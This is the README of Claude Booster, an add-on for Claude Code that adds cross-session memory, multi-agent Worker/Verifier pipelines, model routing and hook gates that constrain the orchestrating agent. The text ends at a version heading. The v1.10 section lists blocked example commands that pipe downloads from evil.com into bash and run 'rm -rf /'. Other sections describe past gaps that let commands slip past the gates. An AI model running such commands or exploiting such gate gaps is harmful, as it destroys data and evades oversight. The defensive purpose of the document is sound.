**🇬🇧 English** | [🇷🇺 Русский](README.ru.md)

# Claude Booster

**Stop re-teaching Claude Code the same things every morning.**

Claude Code out of the box has no memory across sessions, no institutional learning, no cross-project knowledge transfer. By week three of daily use, you notice:

- You re-explain the stack, the conventions, the failure modes — every session.
- Claude reimplements a helper you already have, because it didn't grep first.
- Same clarifying questions, day after day. ("npm or pnpm?" — you answered yesterday.)
- A hook silently stopped firing and you discovered it 3 weeks later.
- Every new project starts at zero. Hard-won lessons from the old one don't transfer.

Claude Booster turns those sessions into a compounding asset. One `python install.py` on any Mac or Linux box and your Claude Code starts **remembering, learning, and auditing itself**.


**Kill date if no positive results:** 2026-05-22.

---

## Three quality innovations

Claude Booster ships three mechanisms that address the three failure modes of LLM agents working on multi-session projects:

### 1. The Тройка — Flow Designer → Worker + Verifier

When Claude delegates a coding task, it runs a **three-agent pipeline**:

1. **Flow Designer** (Opus) maps every failure mode, temporal gap, and state cascade — producing a Process Flow Document (PFD) before any code is written
2. **Worker** (Sonnet) implements the change with PFD-derived directives as hard requirements
3. **Verifier** (Sonnet) writes an executable acceptance test — without seeing the Worker's code or prompt

The Lead runs the Verifier's test. Exit code = verdict. No subjective "looks good to me."

**Why this matters:** Single-agent workflows suffer from two biases: self-evaluation (same model writes and reviews) and flat-snapshot thinking (no consideration of what happens at T+1, T+2, ...). The Flow Designer forces temporal/branching analysis upfront. The Verifier breaks the self-evaluation loop by testing observable behavior independently.

**In practice:** The `/go` command (v1.12) hardcodes this pipeline as a single invocation. `go_gate.py` enforces it — during IMPLEMENT phase, any coding Agent spawn without an active `/go` pipeline is physically blocked by the hook.

See `~/.claude/rules/paired-verification.md` for the Worker/Verifier protocol, `~/.claude/rules/flow-designer.md` for PFD methodology, and `templates/commands/go.md` for the hardcoded pipeline.

### 2. Temporal-causal 3D memory — kills cross-session stuck loops

Standard memory stores facts. Claude Booster's memory stores **causal chains**: what was tried → what happened → what was concluded → what's still open. The stuck-loop detector hashes normalized topic keywords across handovers and fires when the same problem reappears 3+ times without a `verify_gate=pass` resolution.

**Why this matters:** Without causality, each session re-discovers the same problem, proposes the same fix, and fails the same way — across days or weeks. The 3D structure (time × topic × outcome) lets `/start` detect this pattern and force a reframe (Q1–Q4 questions) before the session repeats the loop.

**In practice:** `rolling_memory.py start-context --stuck-check` surfaces candidates with hash, appearance count, and reframe questions. The session must answer Q1–Q4 or explicitly supersede the topic. Silently re-listing a stuck topic is blocked.

See `~/.claude/scripts/rolling_memory.py` for the hash algorithm and `~/.claude/rules/commands.md` (now `/start` command) for the stuck-loop discipline.

### 3. Smart model routing — right model for the right task

Claude Booster doesn't run every agent on the same model. The Lead routes each delegate to the right tier:

| Tier | Model | When |
|------|-------|------|
| Trivial | Haiku 4.5 | Grep, file lookup, path search — instant, lightweight |
| Coding | Sonnet 4.6 | Workers and Verifiers writing code, tests, configs (≥20 lines) |
| Medium | Sonnet 4.6 | Research, single-file review, routine audits |
| Hard | Opus 4.7 | Architecture, security review, consilium, deep debugging |

The **Lead** (orchestrator) stays on **Opus 4.7** — strongest model for synthesis, routing, and judgment. Optionally, with `/fast` toggle, the Lead runs on **Opus 4.7 fast output** (~2.5x faster tokens). To pin the old Opus 4.6 fast mode: `CLAUDE_CODE_OPUS_4_6_FAST_MODE_OVERRIDE=1`.

A typical тройка task spawns 1 Flow Designer on Opus (foreground, ~30-60s), then 2 agents (Worker + Verifier) on Sonnet in parallel (~40-60s). The Lead orchestrates on Opus. Total wall-clock: 90–120 seconds for what would take 5–8 minutes with everything on one model sequentially.

**On Claude Max:** model routing (Haiku/Sonnet/Opus delegation) works out of the box within the subscription. **Fast mode is NOT included in the Max subscription** — it is billed as extra usage at $30/$150 per MTok from the first token, even if you have remaining plan usage. Enable with `/fast` only when speed justifies the cost.

**On API / pay-per-token plans:** model routing still works and actually *saves* money (Haiku and Sonnet are significantly cheaper than Opus). But you're paying per token, so budget accordingly. To disable routing and use a single model, remove the `[CRITICAL] Model routing` section from `~/.claude/rules/tool-strategy.md`.

---

## What's new in v1.12 — `/go`: One Command to Rule the Pipeline

**Your AI agent now has a conscience — and it physically cannot cheat.**

The biggest problem with multi-agent pipelines isn't the agents themselves — it's the orchestrator skipping steps under pressure. "I'll just edit it directly, the PFD is overkill for this..." and suddenly you have untested code in production. Claude Booster v1.12 makes this impossible.

### `/go` — The Тройка Pipeline in One Command

One command. Three agents. Zero shortcuts.

```
/go <Artifact Contract>
```

That's it. From this single invocation, the system spawns:
1. **Flow Designer** (Opus) — produces a Process Flow Document mapping every failure mode, temporal gap, and state cascade
2. **Worker** (Sonnet) — implements the task with PFD-derived directives as hard requirements
3. **Verifier** (Sonnet) — writes an executable acceptance test *without seeing the Worker's code*

The Lead runs the test. Exit code = verdict. No subjective "looks good to me." No skipped steps. No human in the loop between spawn and result.

**Built-in retry intelligence:** When tests fail, `/go` classifies the failure (Worker missed a requirement? Verifier overstepped? Contract ambiguous? Environment broken?) and respawns the right agent with the failed session's context injected. Up to 3 retries, fully automatic.

### `go_gate.py` — The Self-Enforcement Hook

Here's what makes v1.12 different from "just another pipeline template": **the system enforces itself on itself.**

`go_gate.py` is a PreToolUse hook that fires on every `Agent` spawn. During the IMPLEMENT phase, if you try to spawn a coding agent without an active `/go` pipeline — the hook blocks you. Exit code 2. Red text. No bypass.

This means:
- The Lead literally cannot "just quickly fix this inline" during implementation
- Every coding delegation goes through Flow Designer → Worker + Verifier
- The тройка is not a suggestion — it's a physical constraint

**Smart detection:** The hook uses description-prefix matching (`Explore:`, `Plan `) to allow research agents through while blocking coding agents. Subagent type takes priority. Gerunds (`Exploring...`, `Planning...`) are correctly blocked — they're coding agents wearing research clothes.

### Noise Reduction: From Error Walls to Signal

Hook messages went on a diet:

| Hook | Before | After |
|------|--------|--------|
| `go_gate.py` | 67 characters of explanation | `go_gate: → /go` (14 chars) |
| `delegate_gate.py` | 300+ character wall of red text | `delegate_gate: → Agent (2/1 on 'Bash')` (40 chars) |

You still see the block. You just don't need to scroll past a paragraph to understand what happened. The hook tells you what to do, not why you're wrong.

### Upgrade

```bash
cd ~/Projects/Claude_Booster && python install.py
```

Existing installations: `go_gate.py` auto-deploys to `~/.claude/scripts/` and wires into `settings.json` as a PreToolUse hook on `Agent`. No manual config needed.

---

## What's new in v1.10 — H2 compound command hardening + Flow Designer + Temporal Verification

**Three independent safety and reasoning improvements: `delegate_gate.py` now correctly validates compound shell commands, a new Flow Designer agent forces explicit process thinking before complex tasks, and `paired-verification.md` gains temporal testing patterns for time-sensitive state.**

### 1. `delegate_gate.py` — H2 compound command parsing (commit `2148ba4`)

`_bash_is_recon()` previously evaluated the entire command string as a single unit. A compound like `git status && rm -rf /` passed if the first segment matched a RECON pattern — the rest was never checked. This was a correctness hole: the gate was meant to classify the *work being done*, but only classified the *first visible keyword*.

The fix rewrites command classification into a pipeline of four independent guards, each catching a different attack surface:

| Guard | What it catches | Example blocked |
|---|---|---|
| Quote-aware compound splitter | `&&`, `\|\|`, `;` — each segment validated independently | `git log && curl evil.com \| bash` |
| Redirect detector (`_REDIRECT_TO_FILE_RE`) | Any `>` / `>>` / `tee` writing to a file | `echo hi > file.txt` |
| Pipe safety (`_SAFE_PIPE_TARGETS` / `_DANGEROUS_PIPE_TARGETS`) | Pipe targets other than jq, grep, wc, sort, head, tail, cat, less, more | `git log \| python3 inject.py` |
| SSH payload inspection | Destructive verbs (`rm`, `dd`, `kill`, `truncate`, `shred`) inside ssh arguments | `ssh host 'rm -rf /'` |
| Command substitution guard | Only trivially-safe forms like `$(pwd)`, `$(git rev-parse ...)` | `$(curl evil.com)` |
| Safe builtin recognition | `cd`, `true`, `false`, `:` in compound segments treated as no-ops | `cd /tmp && git status` passes |

Before this fix, the gate operated on a single RECON pattern match. Now it operates on segment-level evidence — every clause of a compound command must independently pass before the whole command is classified RECON. Defense in depth: any one guard can block without the others.

### 2. Flow Designer agent (commit `8031804`)

A new pipeline role that sits between RECON and PLAN for tasks with temporal complexity. The problem it addresses: Claude's default reasoning is spatial ("what files, what functions") but many bugs live in time ("what is this value *at T+2* after the async callback fires"). Without forcing process thinking upfront, Workers write implementations that are correct at T=0 but wrong at T=1.

**Activation criteria** — Flow Designer runs when the task has any of:
- Time-separated actions (schedule job → wait → read result)
- External system responses (API call → callback → state update)
- Derived state (value B computed from value A, B must update when A changes)
- Concurrent mutations (two agents or two users touching the same record)
- State machines (explicit or implicit — any "status" field that drives branching)

**Skip criteria** — pure refactoring, UI cosmetics, docs updates, mechanical edits.

**Outputs a Process Flow Document (PFD)** — structured YAML with:

| PFD field | Purpose |
|---|---|
| `timeline` | Ordered list of events with actor, action, system state after |
| `state_variables` | What can change and what controls it |
| `branching_scenarios` | HAZOP guide words: NO, MORE, LESS, REVERSE, LATE, EARLY, OTHER, PARTIAL |
| `failure_modes` | One row per scenario: trigger → effect → detection → recovery |
| `invariants` | Properties that must hold after every scenario |
| `worker_directives` | Concrete implementation constraints derived from the above |
| `verifier_assertions` | Executable test shapes for each invariant and branch |

The HAZOP guide words are the key mechanism. Instead of asking "what could go wrong?" (open-ended, easy to skip), Flow Designer asks seven closed questions: what if this value is completely absent (NO)? what if it's larger than expected (MORE)? what if it arrives out of order (LATE)? This forces coverage of the failure modes that actually cause production incidents, not the ones that are easy to imagine.

### 3. Temporal & Process Verification (commit `8031804`)

Extension to `paired-verification.md` (~120 additional lines). When an Artifact Contract references a PFD, the Verifier's job expands from "write an acceptance test" to "write tests that cover the PFD's timeline, branches, and invariants."

Four new testing patterns added to the Verifier protocol:

| Pattern | What it tests | Mechanism |
|---|---|---|
| Mock clock / controllable time | Temporal correctness — does the system behave right at T, T+1, T+n? | Inject a fake clock; advance it programmatically |
| Branch injection | One test case per `branching_scenarios` entry in the PFD | Parametrized test; scenario label becomes test name |
| Cascade verification | When X changes, does B update? Does stale B get invalidated? Does partial cascade leave a consistent state? | Pre/post state capture; check each dependent field |
| Invariant assertion | PFD `invariants` checked after every scenario, not just the happy path | Run invariant suite as a fixture teardown |

The distinction from standard Verifier testing: standard tests check that the Worker's implementation does what the spec says. PFD-linked tests check that the implementation handles *time* correctly — the dimension that specs typically leave implicit and implementations typically get wrong.

### Tests

- **`delegate_gate.py` H2 guards:** 85/85 green across 3 test scripts (`test_delegate_gate.sh`, `test_delegate_gate_codex.sh`, `test_delegate_gate_toctou.sh`). Zero regressions on existing 74 assertions; 11 new assertions cover compound splitting, redirect detection, pipe safety, SSH payload, and command substitution.
- **Flow Designer + Temporal Verification:** validated against two real tasks in session `8031804` — both produced PFDs; Verifier generated branch-injection tests from `branching_scenarios`; all exit 0.

---

## What's new in v1.9.3 — Enforcer deadlock fix + git exemptions

**Two bugs in the hook pipeline that created a blocking loop for the Lead orchestrator.**

### 1. `model_tag_enforcer.py` — category inference + advisory codex routing

The enforcer's `_infer_category()` classified Agent calls like "Apply order marker overlay to 5 frontend files" as `medium` (default fallback) instead of `coding`. The balancer routes `medium` to `codex-cli` → enforcer hard-blocked the Agent call → Lead couldn't delegate → delegate_gate blocked inline work → deadlock.

Three fixes:

| Bug | Fix |
|---|---|
| Coding keywords too narrow — "apply", "edit", "update", "add", "change", "modify" missing | Added `_CODING_KEYWORDS` frozenset with 12 action verbs |
| Explicit `[category]` tags in description ignored — Lead had no override | Added `_CATEGORY_TAG_RE` parser; `[high_blast_radius]`, `[coding]`, etc. now return immediately |
| Codex routing was a hard block (exit 2) — Agent blocked even when codex wasn't available | Converted to advisory (exit 0 + stderr warning). Safety gates (`dep_guard`, `verify_gate`, `financial_dml_guard`) stay hard blocks; budget optimization is a suggestion |

Design principle established: **safety gates = hard blocks, budget optimizations = advisory**. The enforcer now prints `[advisory]` to stderr when the balancer prefers codex, but doesn't prevent Agent usage.

### 2. `delegate_gate.py` — git source control ops exempt from budget

`RECON_BASH_PATTERNS` only had read-only git commands (`status`, `diff`, `log`, `show`...). After the Lead completed work via an agent, `git add && git commit` consumed the delegate budget and triggered the gate — blocking the commit that delivers the work.

Added 7 git operations to the exemption regex: `add`, `commit`, `push`, `worktree`, `cherry-pick`, `merge`, `rebase`. These are source control operations, not inline coding work — they deliver or integrate work that was already done through proper delegation.

### Tests

- **model_tag_enforcer:** 26 new assertions (explicit tags, coding keywords, regression, tag priority, blast-radius). All pass.
- **delegate_gate:** 74 existing assertions across 4 suites (codex, phase, TOCTOU, TTL) — 0 regressions. 8 additional regex verification tests for the new git commands.

---

## What's new in v1.9.2 — Codex sandbox: git worktree + enforcer tier fix

**Two changes shipped in this release.**

### 1. `codex_sandbox_worker.sh` — git worktree replaces rsync

The original sandbox approach copied the entire project tree via `rsync` into a temp directory, ran Codex there, and diffed the result. It worked, but it was slow (~2 min on a 262-file repo) and fragile (symlinks, gitignored binaries, permission drift).

The new implementation uses `git worktree add --detach` — a first-class Git primitive that creates an isolated checkout sharing the same `.git` object store. Benefits:

| Before (rsync) | After (git worktree) |
|---|---|
| ~2 min setup | 127 ms setup |
| Copies every file, including untracked | Only tracked files, clean state |
| Manual cleanup on failure | `git worktree remove --force` is atomic |
| Permission drift possible | `chmod 700` on worktree dir at creation |

The worker pipes the task to `codex exec`, captures all changes as a unified diff on stdout, and cleans up the worktree on exit. Lead applies each hunk via `Edit`/`Write` — so `dep_guard.py`, `financial_dml_guard.py`, and `verify_gate.py` all fire normally on every edit.

### 2. `model_tag_enforcer.py` — tier-level model comparison

The enforcer's routing check compared model names with string equality (`model_param != recommended_model`). Agent tool accepts short names (`"sonnet"`), but `model_balancer.json` stores full IDs (`"claude-sonnet-4-6"`). Result: every correctly-routed Agent call was blocked as a "mismatch."

Fixed by adding `_extract_tier()` — a normalizer that extracts the tier keyword (`opus`/`sonnet`/`haiku`) from any format. Comparison now happens at the tier level, not the string level.

### Also in this release

- **Security:** `chmod 700` on worktree directory immediately after creation (prevents `.env` leaks under default `umask 022`).
- **Docstring cleanup:** removed references to `rsync`, `mktemp`, and the defunct auto-inject mode (`CLAUDE_MODEL_TAG_AUTO_INJECT`).
- **Dead code removal:** `_AUTO_INJECT_ENV` constant and `updated_fields` dict removed from enforcer (CC bug #16598 makes `updatedInput` unusable).
- **Test update:** `test_codex_sandbox_worker.sh` keyword assertions updated from `rsync`/`mktemp` to `worktree` — 28/28 green.
- **Dogfooding:** this README section was generated by `codex_sandbox_worker.sh` itself (gpt-5.3-codex via git worktree sandbox).

---

## What's new in v1.8.0 — model_balancer: data-driven model routing across providers

**The problem this release solves.** Three weeks of running Claude Booster on a Max-86%-weekly-used profile surfaced a structural gap: the routing rules in `tool-strategy.md` were static. Trivial → Haiku, Coding → Sonnet, Hard → Opus — fine on paper. In practice:

1. **Claude infra got 3× slower for hours-at-a-time** (2026-05-12 incident — observable as a p75 latency spike on every Sonnet/Opus delegate). The static map had no signal to react to it. Lead kept routing coding work to Sonnet at 4× its baseline per-turn-ms while a perfectly good Codex `gpt-5.3-codex` sat idle on the ChatGPT Pro subscription that was already paid for.
2. **Weekly Max usage was at 86 %.** Every Opus delegate burned more of the dwindling budget when an equivalent-quality Codex path was available — and the routing layer had no way to know it.
3. **Manual JSON editing.** The only way to override the static map was to hand-edit `tool-strategy.md`, restart the session, and hope you remembered to undo it tomorrow.

The fix is `model_balancer` — a daily routing decision engine that observes actual model performance via PostToolUse hooks, persists a per-category routing dict at `~/.claude/model_balancer.json` (one file for all projects on the same UTC day), and lets `tool-strategy.md` stay as the **fallback** when the data doesn't tell a clear story.

### How it works

**Collection.** A new PostToolUse hook (`model_metric_capture.py`, ~140 LOC) fires on every `Task`/`Agent`/`Bash` tool call. For Task/Agent it extracts `tool_response.usage.duration_ms` and computes `per_turn_ms = duration_ms / max(num_turns, 1)`. For Bash, it matches `codex_worker.sh` or `codex exec -m <MODEL>` to capture Codex CLI invocations. Rows land in a new `model_metrics` table (schema v7 of `rolling_memory.db`): `(ts_utc, provider, model, task_category, duration_ms, num_turns, per_turn_ms, tokens_in, tokens_out, success, session_id, project_root)`. Bypass via `CLAUDE_BOOSTER_SKIP_METRIC_CAPTURE=1`.

**Decision (active path).** Once per UTC day, `model_balancer.py decide` runs as a SessionStart hook. The active path (day-N) reads `model_metrics` over a 14-day window, groups by `(provider, model)` within each `task_category`, keeps only groups with `n_samples >= MIN_SAMPLES` (default 5, env-overridable), and applies a Pareto score per candidate:

```
score = 0.5 * intelligence_score        # 0..20  — from openai_models.json + Anthropic table
      - 0.3 * (p50 / max_p50) * 20      # latency penalty, normalized in-category
      - 0.2 * weekly_max_pct * 20       # budget pressure — only for Anthropic provider
```

Tie-break: lower p50, then higher success rate. Pinned categories — `lead` (always `anthropic:claude-opus-4-7`) and `high_blast_radius` (always `anthropic:claude-sonnet-4-6` with `applies_to: [auth, security, secrets, db_migrations, financial_dml, infra_config]`) — are restored unconditionally so PreToolUse guards (`dep_guard.py`, `financial_dml_guard.py`, `verify_gate.py`) still fire on writes to sensitive code. Every routing change appends a row to `transitions[]` (capped at 50) with `{category, old, new, computed_at, n_samples_winner, p50_ms_winner}` — so you can read the file and see *why* yesterday's coding category flipped from Sonnet to gpt-5.3-codex.

**Visibility at /start.** Two new blocks are injected into `additionalContext` so Lead sees today's routing decision and quota state at the top of every session:

```
=== MODEL BALANCER ===
  * date=2026-05-12 (fresh) — lead=anthropic:claude-opus-4-7, coding=codex-cli:gpt-5.3-codex, hard=codex-cli:gpt-5.5, audit=pal:gpt-5.5

=== LIMITS ===
  * 5h window: anthropic 14k tokens / 12 calls · codex-cli 89k tokens / 6 calls
  * /lead supervisor: state=inactive
  * weekly_max_snapshot: 86% (captured 2026-05-12)
  * codex_pro_quota: (no source — wire in day-N)
```

**Hook safety.** The entire active path is wrapped in `try/except Exception` — on any error, `decide()` falls back to `_build_refreshed(prior)` (day-1 passive date refresh). SessionStart never crashes. All DB reads use `file:?mode=ro` URI with 2 s timeout. Two escape hatches: `CLAUDE_BALANCER_DISABLE_ACTIVE=1` (force passive day-1 mode, rationale is explicitly marked `"passive — ... bypass"`), `CLAUDE_BALANCER_FORCE_ACTIVE=1` (re-evaluate even if today's decision exists).

**Routing precedence (when delegating).** Explicit `model:` parameter in `Agent` call > balancer's daily decision > static `tool-strategy.md` defaults. So a one-off override still wins; the balancer is the new default, not a hard mandate.

### Why Codex CLI as a second provider

ChatGPT Pro subscription is flat-fee. Codex `gpt-5.5` has `intelligence_score=20` in `~/.claude/openai_models.json` — same tier as Opus 4.7. On a 86%-weekly-used Max day, every bio-agent or hard-task delegate that can route to Codex saves Anthropic budget without quality cost. The integration is a subprocess wrapper (`codex_worker.sh`, 19 LOC) — no MCP server, no auth juggling. Lead spawns it via `Bash`, captures stdout, classifies the metric, and the next day's balancer sees the latency data. The runtime probe on 2026-05-12 confirmed that ChatGPT-subscription Codex auth supports `gpt-5.5`, `gpt-5.4`, `gpt-5.4-mini`, `gpt-5.3-codex`, `gpt-5.3-codex-spark`, `gpt-5.2` — six models, all live. The tier hierarchy in `reports/recon_2026-05-12_model_balancer.md` was preserved; older catalog names (`gpt-5-nano`, `gpt-5-codex`, `gpt-5.1-codex`) return 400 and were dropped.

### What's NOT done (day-M carry-out)

- **`claude_max_tracker.py`** — `weekly_max_pct` is still a snapshot value read from `inputs_snapshot.claude_max_weekly_used_pct`. The scoring algorithm already consumes it, but the source needs to become live (stream-json adapter agg into a new `claude_max_usage` table).
- **Codex Pro quota live source** — RECON found no `codex usage`/`codex status` CLI command. Either grep stderr for rate-limit markers or HTTP-probe the subscription endpoint. Today the limits block honestly says `(no source — wire in day-N)`.
- **Adaptive override** — current decision is frozen for 24 h. The consilium decision allowed an adaptive override (3 consecutive calls > p95 × 2 → switch to fallback); not implemented yet.

### Dogfooded — /simplify caught what review-by-author would miss

The 360-LOC active `decide()` path went through paired Worker+Verifier (both Sonnet via `Agent` — `high_blast_radius`, so PreToolUse guards fire). Worker's first attempt regressed `rolling_memory.py` schema to v6 to match a runtime DB state — code-over-docs override prevented merging; Lead respawned with explicit "trust the Artifact Contract, not the DB" and a ground-truth schema in the brief. Retry passed 11/11 immediately.

Then `/simplify` ran 3 parallel review agents (reuse / quality / efficiency) on the 4477-line diff. 14 findings; 11 applied:

- **Stringly-typed providers** — `"anthropic"` repeated 18 times across the three new scripts → `PROVIDER_ANTHROPIC` / `PROVIDER_CODEX` / `PROVIDER_PAL` constants. Silent-typo class of bugs eliminated.
- **Timestamp format drift** — `model_metric_capture.py` was writing `datetime.now(timezone.utc).isoformat()` (`2026-05-12T15:30:00+00:00`) into `model_metrics.ts_utc`, but `model_balancer.py` compared against SQLite's `datetime('now','-14 days')` (`2026-05-12 15:30:00`). Lexical comparison happened to work, but was fragile. Switched the hook to use SQL `datetime('now')` directly — format consistent, Python timestamp computation removed.
- **Hot-path DB cost** — the PostToolUse hook fires on every tool call. Added `isolation_level=None` (autocommit) + `PRAGMA synchronous=NORMAL` — saves ~3-8 ms per invocation, ~0.6-1.6 s over a typical 200-call session.
- **Double JSON read at /start** — `_build_balancer_summary` and `_build_limits_summary` were each `read_text + json.loads`-ing the same `~2 KB` file. Extracted `_load_balancer_data()`, parse once in `main()`, pass dict to both helpers.
- **Two DB connections in `_build_limits_summary`** — one for the 5h-window query, one for `supervisor_quota`. Worst-case 4 s timeout under contention. Merged into a single connection.
- **Magic numbers named** — `_LEAD_QUOTA_TOKENS = 50_000` (matches `supervisor/quota.py session_token_cap`), `_INTELLIGENCE_SCORE_UNKNOWN = 15` (neutral fallback for `gpt-5.3-codex` variants not yet in `openai_models.json`).
- **Duplicated rationale→source mapping** — extracted to `_rationale_to_source()`; surfaced a `"passive"` branch that had been silently mapped to `"seed"`.
- **Removed dual-location read of `transitions[]`** — schema canonicalized to top-level.

Tests held: **7/7 suites, 125 assertions**, no regressions across the simplify pass.

### Quick start

```bash
# See today's routing decision
python3 ~/.claude/scripts/model_balancer.py show

# Force re-evaluation (e.g. after seeding metrics manually)
CLAUDE_BALANCER_FORCE_ACTIVE=1 python3 ~/.claude/scripts/model_balancer.py decide --force

# Query routing for one category
python3 ~/.claude/scripts/model_balancer.py get coding
# → {"provider": "codex-cli", "model": "gpt-5.3-codex"}

# Disable active path (fall back to day-1 passive refresh)
CLAUDE_BALANCER_DISABLE_ACTIVE=1 python3 ~/.claude/scripts/model_balancer.py decide --force
```

The balancer is opt-in via the SessionStart hook — installed automatically by `python3 install.py`, but bypassable per-session if you ever need a deterministic routing day.

---

## What's new in v1.7.0 — Auto-/compact discipline + Token budget reduction

**Two problems this release solves:**

1. **Booster's always-on rule budget was 33,766 tokens.** Three big rules files (`paired-verification.md` 29kB, `quality-no-defects.md` 18kB) loaded on every prompt despite being needed only during code-edit / delegation work. On non-coding prompts (RECON, discussions, /handover), ~12k tokens of rules got cached-but-still-shipped for nothing.

2. **`/compact` discipline relied on Lead's self-check.** Built-in autocompact fires at 80% (~800k of 1M context) — too late for cost discipline. The rule "Lead should self-check at 120k" is unreliable under context pressure — Lead under attention saturation forgets to count tokens.

### Auto-/compact advisor — hook-based, parallel, one-shot

`compact_advisor.py` runs as PostToolUse hook on every tool call. It estimates transcript size (bytes // 4 ≈ tokens) and when the threshold is crossed (default 120,000, configurable via `CLAUDE_BOOSTER_COMPACT_THRESHOLD`), writes a one-shot marker `~/.claude/.compact_recommended_<session_id>`.

`compact_advisor_inject.py` runs as UserPromptSubmit hook on every user prompt. If a marker exists for the current session, it emits an advisory via `additionalContext` — Claude sees a one-line reminder in its next prompt context: *"⚠ Auto-advisory: context ≈ N tokens (>120k). Run /compact before the next non-trivial task."* — then deletes the marker. One-shot per crossing — won't spam.

Bypass via `CLAUDE_BOOSTER_SKIP_COMPACT_ADVISOR=1`. Logs every invocation to `~/.claude/logs/compact_advisor.jsonl` so SRE can post-hoc answer "did it fire, when, at what estimate?".

**This release was dogfooded.** Booster's own `/audit` command was run against these new hooks the same day they shipped. Three Sonnet lens agents (correctness, security, operational) independently flagged two HIGH-severity findings: path-traversal via unsanitized `session_id` in the marker path (could `unlink` arbitrary user-writable files), and a module-level `int()` on the env var that silently disabled the advisor for the entire session if the user mistyped the threshold. Both fixed in the same session via paired Worker+Verifier (Sonnet). Three additional MED findings (orphan marker cleanup, zero logging, broken one-shot guarantee on `unlink` race) also fixed. Audit report at `reports/audit_2026-05-11_compact_advisor.md`.

### Token budget reduction — gate big rules

`paired-verification.md` and `quality-no-defects.md` got frontmatter `description:` + `paths:` glob gating. They load only when the conversation touches code (`*.py`, `*.ts`, `*.tsx`, `*.sql`, etc.) or paired delegation comes into scope. On non-coding prompts the harness skips them.

Expected effect: rules always-on bytes drop from 33,766 → ~21,000 (saves ~12k tokens per non-coding prompt). The `telemetry_agent_health.py` always-on estimate doesn't model frontmatter gating yet — that's deferred (the savings show up in Anthropic dashboard cost, not in the local estimate).

### Model routing — selective, not aggressive

`/handover` write-agent now routes to Sonnet by default (`model: "sonnet"`) — report synthesis is fine on Sonnet, Opus is overkill. Git-log/diff collector subagents → `model: "haiku"`.

`/consilium` and `/lead` stay on **Opus by default** — these commands are deliberately invoked for hard reasoning (multi-perspective architectural debate, autonomous supervised workers), Opus quality is priced in. An earlier attempt to downgrade them to Sonnet was reverted in `faa62c7` after the user's pushback — saved as feedback memory: `/consilium and /lead — keep Opus`.

### Built-in Quality applied

This release demonstrates the Three Nos (Jikotei Kanketsu) at the agent layer:
- **Do not accept defects:** UUID regex guard on `session_id` at input boundary
- **Do not make defects:** `try/except ValueError` around module-level `int(env)`, atomic tempfile + `os.replace` for marker write
- **Do not pass on defects:** JSONL logging on every code path for post-hoc diagnosability, Stop hook cleans up orphan markers from crashed sessions

---

## What's new in v1.6.0 — Multi-Agent Audit + Smart Delegate Gate

**Two things that looked fine on the surface but weren't.**

### /audit — From single-reviewer to six-lens parallel tribunal

Here's the problem: when you type `/audit`, Claude reads the diff once. One model. One perspective. The same model that wrote the code (or reviewed it moments ago) now judges it. This is exactly like asking the author to proofread their own manuscript — you'll catch the obvious, miss the subtle.

Before v1.6.0, `/audit` was a footnote inside `/consilium` — "or audit" in the description, same single-agent flow. The word "audit" triggered a single-reviewer mental model because that's what was actually happening.

**What v1.6.0 changes.** `/audit` is now a standalone 751-line command that spawns a parallel tribunal of six specialized agents, each with a unique background and mandatory grep patterns for independent RECON:

| Lens | Focus |
|------|-------|
| **Correctness** | Logic bugs, edge cases, off-by-ones, exception paths |
| **Security** | Auth bypasses, injection vectors, secrets in code, CORS, privilege escalation |
| **Performance** | N+1 queries, unbounded loops, missing indexes, memory leaks |
| **Architecture** | Interface violations, coupling, dependency direction, contracts broken |
| **Data Integrity** | Silent corruption paths, missing transactions, race conditions, validation gaps |
| **Operational** | Logging gaps, missing health checks, unhandled errors that surface at 3am |

Every auditor also hits the PAL MCP (GPT external review) — independent second opinion from a different model entirely. All seven reviewers (6 agents + GPT) spawn in **one parallel message**. Results: structured `PASS / FAIL / CONCERN` verdicts with `file:line` evidence, a verdict matrix, cross-lens findings where two reviewers flag the same area independently, and a prioritized action plan.

Use `--scope path/to/feature` to limit the blast radius. Use `--focus security,performance` to select specific lenses when you know where the risk is.

`/consilium` is also cleaned up: it no longer references audit at all. Two distinct tools, two distinct jobs.

### Delegate Gate — RECON_BASH_PATTERNS exemption

The delegate gate enforces that Lead doesn't do inline work — it delegates. One write-intent action per window, then it must spawn an agent.

The problem: the gate was counting `git status` the same as `git push`. `ssh user@host 'cat /proc/version'` the same as `rm -rf`. Every read-only diagnostic command consumed the same budget slot as a destructive write. The practical consequence: `/start` couldn't run its own health checks. Lead had to spawn a Haiku agent just to run `git diff`. A `curl` to verify a deployment was blocked as if it were a config mutation.

**What v1.6.0 changes.** `RECON_BASH_PATTERNS` — 8 regex patterns that classify Bash commands as read-only recon, exempt from the budget. These patterns cover:

- `.claude/scripts/*` diagnostic scripts (health checks, telemetry, canary)
- `git status`, `git diff`, `git log`, `git add`, `git commit`, `git push`, `git worktree`, `git cherry-pick`, `git merge`, `git rebase` (including `git -C /path` prefix)
- `ssh` commands that read remote state
- `ls`, `find`, `grep`, `diff`
- `curl`, `wget` (verification, not mutation)
- `docker ps`, `docker logs`
- `gh pr list`, `gh issue view`
- `pip list`, `npm list`

Read-only Bash is now free, like `Read` or `Grep`. Only write-intent Bash — edits, deploys, installs, mutations — counts against the 1-action budget.

The `/simplify` review on this change caught 6 findings that were fixed before shipping: stale docstring, anchor mismatches in pattern logic, and a backtrack-prevention gap that would have let a write command disguise itself as recon via a crafted prefix.

---

## What's new in v1.5.1 — Memory Bridge + Delegate Gate Hardening

**Three problems this release solves:**

1. **"Remember this" writes to markdown files but not to rolling_memory.db.** Claude Code's native memory system writes `.md` files. Claude Booster's cross-session engine uses `rolling_memory.db`. The two systems were disconnected — a "remember" command would save to one but not the other. Fix: a PostToolUse hook now auto-mirrors every memory file write to `rolling_memory.db` via a fire-and-forget subprocess. Type mapping (user→feedback, project→project_context, reference→directive), `content_hash` dedup, MEMORY.md exclusion.

2. **`.delegate_mode=off` persists forever — no session scope, no TTL.** A one-time bypass written for a legitimate exception stays active indefinitely. The Horizon project had enforcement silently disabled for 2 weeks from a forgotten `off` file. Fix: bare `off` is now treated as expired. New format `off:<session_id>` scopes the bypass to a single session. When the session ends, the bypass dies.

3. **Counter file race condition (TOCTOU).** Two parallel tool calls could both read `counter=0`, both pass budget check, both write `counter=1` — doubling the effective budget. Fix: `fcntl.flock()` around the read-increment-write cycle. `_atomic_increment` and `_atomic_reset` replace the non-atomic `_read_counter`/`_write_counter` pair.

**Tests:** 24 new assertions across 3 test scripts — memory mirror (10), delegate gate TTL (8), TOCTOU race (6 with 5-iteration concurrency stress).

---

## What's new in v1.5.0 — Systemic Thinking Enforcement

